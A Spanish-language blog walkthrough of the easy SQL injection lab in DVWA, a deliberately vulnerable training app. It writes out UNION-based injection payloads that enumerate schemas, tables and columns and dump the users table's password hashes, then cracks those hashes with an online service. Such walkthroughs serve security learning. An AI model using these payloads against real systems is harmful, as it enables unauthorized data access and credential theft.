---
layout: single
title: Laboratorios de DVWA inyecciones SQL - SQLi
excerpt: "En este post explicaremos la resolución del laboratorio SQLi del laboratorio de pruebas DVWA."
date: 2022-08-03
classes: wide
header:
  teaser: /assets/images/DVWA-SQLi/dvwa.jpg
  teaser_home_page: true
#  icon: /assets/images/hackthebox.webp
categories:
  - vulnerabilidad web
tags:  
  - mysql
  - SQLi
  - DVWA
---

<br>

# Inyección SQL - Nivel fácil

Cuando hayamos montado el sistema de practica DVWA, podremos acceder y ver un menú con diferentes vulnerabilidades, en este caso harémos las de tipo SQLi.

El nivel facil de inyección SQL normal se ve así:

![Inicio](/assets/images/DVWA-SQLi/inicio.png)

Vemos que tiene un apartado para ingresar datos, probaremos poner algun valor, en este caso el valor 1:

![1](/assets/images/DVWA-SQLi/id1.png)

Podemos apreciar que nos muestra que existe un usuario con el id 1, en este caso ese usuario es admin.

probamos más números y nos dimos cuenta que existe hasta el usuario 5.

![5](/assets/images/DVWA-SQLi/id5.png)

Vemos que este último usuario tiene de nombre Bob Smith.

<br>

Y cuando no existe un usuario, por ejemplo 6:

![6](/assets/images/DVWA-SQLi/id6.png)

Simplemente no nos muestra nada en caso de que el id de usuario no exista.

Ahora probaremos romper la consulta, como sabemos lo haremos con una comilla simple:

`1'`

De esta forma, y al tramitar este dato nos arroja el siguiente error:

![error](/assets/images/DVWA-SQLi/error.png)

Lo cual nos comienza a surgir ideas de que es vulnerable a SQLi, ya que nos marco error directo de la base de datos.

Ahora intentaremos inyectar esta consulta:

`1' OR 1=1 -- -`

Y vemos que nos devuelve lo siguiente:

![users](/assets/images/DVWA-SQLi/allusers.png)

Podemos apreciar que nos interpreto nuestra consulta, nos escapo del campo User ID, y inyecto nuestra consulta que en este caso es OR 1=1, lo que hará que veamos todos los usuarios ya que estamos comentando el resto de la consulta existente evitando limits o algo similar.

<br>

Ahora intentaremos descubrir cuantas columnas se estan devolviendo a la respuesta del servidor web, en este caso sabemos que hay 2 campos, **First name** y **Surname**.

Por lo que intuimos que se devuelven 2 columnas, y esto lo verificaremos con **ORDER BY**:

`1' ORDER BY 2 -- -`

Y vemos esta respuesta:

![order2](/assets/images/DVWA-SQLi/orderby2.png)

Vemos que nos responde con algo, y sabemos que son 2 columnas las que se devuelven ya que de lo contrario si ponemos un valor mayor que 2 nos dará este error:

![order3](/assets/images/DVWA-SQLi/orderby3.png)

Así que ya sabemos que son 2 columnas devueltas, ahora averiguaremos que tipo de dato esta devolviendo, como en la respuesta vimos sabemos que esta devolviendo strings, osea texto, por lo que haremos esta consulta para verificarlo:

`1' UNION SELECT 'texto1','texto2' -- -`

Y como sospechabamos, si eran datos de texto los que devolvia estas columnas:

![strings](/assets/images/DVWA-SQLi/strings.png)

Podemos ver que se agregan las etiquetas 'texto1' y 'texto2' en lugar de sus valores por defecto.

<br>

Ahora intentaremos enumerar los nombres de bases de datos existentes, por lo que haremos la siguiente consulta:

`1' UNION SELECT schema_name,NULL FROM information_schema.schemata -- -`

Y podemos ver que nos enumera las bases de datos existentes:

![db](/assets/images/DVWA-SQLi/databases.png)

Y vemos que nos enumero 2 bases de datos:

- information_schema
- dvwa

Sabemos que la base de datos information_schema es una por defecto que siempre viene y de ahí es donde enumeramos el resto, por lo que aparte de esa por defecto, vemos una que nos llama la atencion, llamada dvwa.

Así que enumeraremos las tablas existentes dentro de esa base de datos:

`1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema = 'dvwa' -- -`

![tables](/assets/images/DVWA-SQLi/tables.png)

Vemos que nos enumero 2 tablas:

- users
- guestbook

Así que enumeraremos las columnas de la tabla **users**, con esta nueva consulta:

`1' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_schema = 'dvwa' AND table_name = 'users' -- -`

Esta vez usamos la funcion GROUP_CONCAT() para que nos sea mas facil ver las columnas sin que se muestre tanto texto, así que nos respondio esto:

![columns](/assets/images/DVWA-SQLi/columns.png)

Vemos que nos enumero las columnas de la tabla **users** y estas columnas son:

- user_id
- first_name
- last_name
- user
- password
- avatar
- last_login
- failed_login

Vemos muchas columnas, pero las que nos llaman la atención son **user** y **password**, por lo que procederemos a enumerarlas:

`1' UNION SELECT GROUP_CONCAT(user,':',password),NULL FROM dvwa.users -- -`

![data](/assets/images/DVWA-SQLi/data.png)

Podemos ver que nos enumero el usuario y password, agregando el caracter : para separar ambas cosas.

Podemos ver que nos dumpeo estos datos:

- admin:5f4dcc3b5aa765d61d8327deb882cf99
- gordonb:e99a18c428cb38d5f260853678922e03
- 1337:8d3533d75ae2c3966d7e0d4fcc69216b
- pablo:0d107d09f5bbe40cade3de5c71e9e9b7
- smithy:5f4dcc3b5aa765d61d8327deb882cf99

Pero vemos que las contraseñas estan hasheadas, por lo que intentaremos crackearlas.

En el sitio [CrackStation](https://crackstation.net) podemos crackear hashes basicos, como este es un nivel facil, los hashes no deben ser complejos así que podemos tirar de esta web, y crackearlos:

![hashcrack](/assets/images/DVWA-SQLi/hashcrack.png)

Y como vemos nos ha crackeado todas las contraseñas de cada usuario:

- password
- abc123
- charley
- letmein
- password

Así que hemos completado el nivel facil de este laboratorio.